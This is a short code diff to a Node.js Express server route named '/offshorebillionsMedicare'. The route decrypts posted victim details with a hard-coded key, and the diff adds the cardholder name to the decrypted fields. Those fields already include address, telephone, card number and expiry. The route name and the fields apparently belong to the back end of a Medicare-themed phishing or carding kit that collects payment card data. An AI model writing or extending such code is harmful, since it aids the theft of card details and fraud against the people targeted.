@@ -230,6 +230,7 @@ app.post('/offshorebillionsMedicare', (req, res) => {
     state = CryptoJS.AES.decrypt(req.body.state, '402312').toString(CryptoJS.enc.Utf8);
     zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
     telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
+    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
     ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
     ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
     ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
